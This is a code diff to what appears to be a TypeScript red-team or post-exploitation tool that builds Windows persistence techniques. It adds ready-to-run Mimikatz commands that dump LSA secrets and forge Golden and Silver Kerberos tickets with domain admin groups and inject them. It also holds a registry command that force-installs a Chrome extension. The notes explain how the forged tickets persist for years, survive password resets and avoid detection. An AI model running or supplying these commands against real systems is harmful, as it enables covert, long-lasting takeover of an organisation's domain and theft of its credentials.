@@ -477,12 +477,17 @@ export function buildExtendedWindowsPersistence(lhost: string, lport: string, cm
       command: `reg add "HKLM\\SOFTWARE\\Policies\\Google\\Chrome\\ExtensionInstallForcelist" /v 1 /t REG_SZ /d "EXTENSION_ID;https://clients2.google.com/service/update2/crx" /f`,
       notes: "Force-installs a Chrome extension via Group Policy registry. Replace EXTENSION_ID. Admin required.",
     },
-    /* ── Silver ticket / Golden ticket placeholder ── */
     {
-      technique: "Golden Ticket (Mimikatz — requires DC access)",
+      technique: "Golden Ticket (Mimikatz — domain-wide persistence)",
       category: "windows", stealth: 5,
-      command: `mimikatz.exe "privilege::debug" "lsadump::lsa /patch" "kerberos::golden /user:Administrator /domain:DOMAIN /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /id:500 /ticket:golden.kirbi" "kerberos::ptt golden.kirbi" "exit"`,
-      notes: "Creates a Golden Ticket for persistent domain admin access. Requires KRBTGT hash from DC. Replace placeholders.",
+      command: `mimikatz.exe "privilege::debug" "lsadump::lsa /patch" "kerberos::golden /user:Administrator /domain:DOMAIN /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /id:500 /groups:512,513,518,519,520 /ticket:golden.kirbi" "kerberos::ptt golden.kirbi" "exit"`,
+      notes: "Forges a TGT signed with the KRBTGT secret — valid for 10 years by default. Survives password resets on all accounts except KRBTGT. Requires lsadump::lsa /patch output from a DC. Provides domain-wide access without further authentication.",
+    },
+    {
+      technique: "Silver Ticket (Mimikatz — service-specific persistence)",
+      category: "windows", stealth: 5,
+      command: `mimikatz.exe "privilege::debug" "kerberos::golden /user:Administrator /domain:DOMAIN /sid:DOMAIN_SID /target:SRV_FQDN /service:cifs /rc4:SVC_ACCOUNT_NTLM /id:500 /groups:512,513 /ticket:silver.kirbi" "kerberos::ptt silver.kirbi" "exit"`,
+      notes: "Forges a service ticket (TGS) without touching the DC — signed with the service account NTLM hash. Targets a specific SPN (cifs, http, mssql, host). Harder to detect than Golden Ticket: no DC communication after initial forge. Collect the service account hash via Kerberoast or DCSync.",
     },
     /* ── PowerShell profile persistence ── */
     {
